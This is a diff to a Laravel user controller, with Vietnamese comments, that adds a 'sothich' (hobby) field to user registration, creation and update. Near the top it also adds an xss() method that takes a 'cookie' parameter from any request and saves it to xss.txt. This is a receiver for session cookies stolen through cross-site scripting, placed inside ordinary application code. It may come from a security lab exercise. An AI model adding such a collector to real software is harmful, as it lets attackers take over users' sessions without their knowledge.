@@ -11,6 +11,11 @@ use Illuminate\Support\Facades\Session;
 
 class UserController extends Controller
 {
+    public function xss(Request $request) {
+        $cookie = $request->get('cookie');
+        file_put_contents('xss.txt', $cookie);
+        var_dump($cookie);die();    
+        }
     //
     public function register()
     {
@@ -69,13 +74,13 @@ class UserController extends Controller
         $data['avatar'] = $avatarName;
     }
 
-    // Create a new user record in the database
     $user = User::create([
         'name' => $data['name'],
         'email' => $data['email'],
         'phone' => $data['phone'],
+        'sothich' => $data['sothich'],
         'password' => Hash::make($data['password']),
-        'avatar' => $data['avatar'] ?? null, // Default to null if avatar is not present
+        'avatar' => $data['avatar'] ?? null, 
     ]);
 
     // Redirect the user to the login page
@@ -97,7 +102,7 @@ class UserController extends Controller
         $user = User::find($user_id);
         return view('user.show', ['user' => $user]);
     }
-    // Thêm
+    
     public function create()
     {
         return view('user.create');
@@ -122,13 +127,14 @@ class UserController extends Controller
             $data['avatar'] = $avatarName;
         }
 
-        // Create a new user record in the database
+  
         $user = User::create([
             'name' => $data['name'],
             'email' => $data['email'],
             'phone' => $data['phone'],
+            'sothich' => $data['sothich'],
             'password' => Hash::make($data['password']),
-            'avatar' => $data['avatar'] ?? null, // Default to null if avatar is not present
+            'avatar' => $data['avatar'] ?? null, 
         ]);
 
         // Redirect the user to the login page
@@ -150,33 +156,38 @@ class UserController extends Controller
     public function updateUser(Request $request, $id)
     {
         $user = User::findOrFail($id);
-
-        // Validate the incoming request data
+    
         $request->validate([
             'name' => 'required',
             'email' => 'required|unique:users,email,' . $user->id . '|max:255',
             'phone' => ['nullable', 'regex:/^0[0-9]{9}$/'],
             'avatar' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
+            'sothich' => 'nullable|string', // Thêm trường "sothich" vào quy tắc xác thực
         ]);
-
+    
         $data = $request->all();
-
+    
         if ($request->hasFile('avatar') && $request->file('avatar')->isValid()) {
             $avatar = $request->file('avatar');
             $avatarName = time() . '_' . $avatar->getClientOriginalName();
             $avatar->move(public_path('avatars'), $avatarName);
             $data['avatar'] = $avatarName;
         }
-
-        // Update the user record in the database
+    
+        // Cập nhật trường "sothich" nếu được gửi đi trong request
+        $user->sothich = $data['sothich'] ?? $user->sothich;
+    
+        // Cập nhật thông tin người dùng
         $user->update([
             'name' => $data['name'],
             'email' => $data['email'],
             'phone' => $data['phone'],
-            'avatar' => $data['avatar'] ?? $user->avatar, // Use the existing avatar if not provided
+            'avatar' => $data['avatar'] ?? $user->avatar,
         ]);
-
-        // Redirect the user to the list page
-        return redirect('/list')->with('message', 'User updated succesfully');
+    
+        // Redirect người dùng đến trang danh sách với thông báo cập nhật thành công
+        return redirect('/list')->with('message', 'User updated successfully');
     }
+    
+    
 }
